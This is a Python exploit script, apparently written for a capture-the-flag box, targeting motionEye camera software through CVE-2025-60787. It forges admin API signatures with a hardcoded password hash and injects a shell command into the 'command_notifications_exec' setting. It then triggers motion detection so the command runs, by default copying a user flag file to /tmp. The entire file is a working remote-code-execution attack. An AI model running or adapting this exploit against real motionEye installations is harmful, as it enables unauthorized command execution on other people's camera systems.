#!/usr/bin/env python3
"""
CCTV Box — motionEye RCE via CVE-2025-60787
Usage: python3 exploit.py "<command>" <output_file>
"""
import hashlib, urllib.parse, urllib.request, json, re, sys, time, os

SIGNATURE_REGEX = re.compile(r'[^a-zA-Z0-9/?_.=&{}\[\]":, -]')
MOTIONEYE_URL   = 'http://127.0.0.1:8765'
MOTION_URL      = 'http://127.0.0.1:7999'
ADMIN_HASH      = '989c5a8ee87a0e9521ec81a79187d162109282f0'

def compute_signature(method, path, body, key):
    parts = list(urllib.parse.urlsplit(path))
    query = [q for q in urllib.parse.parse_qsl(parts[3], keep_blank_values=True)
             if q[0] != '_signature']
    query.sort(key=lambda q: q[0])
    query = [(n, urllib.parse.quote(v, safe="!'()*~")) for (n, v) in query]
    query = '&'.join([q[0] + '=' + q[1] for q in query])
    parts[0] = parts[1] = ''
    parts[3] = query
    path = urllib.parse.urlunsplit(parts)
    path = SIGNATURE_REGEX.sub('-', path)
    key  = SIGNATURE_REGEX.sub('-', key)
    body_str = body or ''
    body_str = body_str and SIGNATURE_REGEX.sub('-', body_str)
    return hashlib.sha1(
        f'{method}:{path}:{body_str}:{key}'.encode()
    ).hexdigest().lower()

def api_get(path):
    full_path = path + ('&' if '?' in path else '?') + '_username=admin'
    sig = compute_signature('GET', full_path, '', ADMIN_HASH)
    url = MOTIONEYE_URL + full_path + '&_signature=' + sig
    return json.loads(urllib.request.urlopen(url).read().decode())

def api_post(path, data):
    full_path = path + ('&' if '?' in path else '?') + '_username=admin'
    body = json.dumps(data)
    sig = compute_signature('POST', full_path, body, ADMIN_HASH)
    url = MOTIONEYE_URL + full_path + '&_signature=' + sig
    req = urllib.request.Request(url, data=body.encode(), method='POST')
    req.add_header('Content-Type', 'application/json')
    try:
        return urllib.request.urlopen(req, timeout=15)
    except:
        pass

def trigger(cmd):
    config = api_get('/config/1/get/')
    config['command_notifications_enabled'] = True
    config['command_notifications_exec'] = cmd
    api_post('/config/1/set/', config)
    time.sleep(2)
    urllib.request.urlopen(MOTION_URL + '/1/config/set?emulate_motion=on')

# --- config ---
cmd         = sys.argv[1] if len(sys.argv) > 1 else \
              'cp /home/sa_mark/user.txt /tmp/flag.txt; chmod 644 /tmp/flag.txt'
output_file = sys.argv[2] if len(sys.argv) > 2 else '/tmp/flag.txt'
max_retries = 10
attempt     = 0

print(f'[*] Command    : {cmd}')
print(f'[*] Waiting for: {output_file}')
print(f'[*] Max retries: {max_retries}\n')

while attempt < max_retries:
    attempt += 1
    print(f'[*] Attempt {attempt}/{max_retries} — injecting and triggering...')
    trigger(cmd)

    # poll every second for up to 10 seconds
    for _ in range(10):
        if os.path.exists(output_file):
            with open(output_file) as f:
                content = f.read().strip()
            if content:
                print(f'\n[+] Success! Contents of {output_file}:')
                print('-' * 40)
                print(content)
                print('-' * 40)
                sys.exit(0)
        time.sleep(1)

    print(f'[-] Not found yet, retrying...\n')

print(f'\n[-] Failed after {max_retries} attempts. Command may need more time or check manually.')
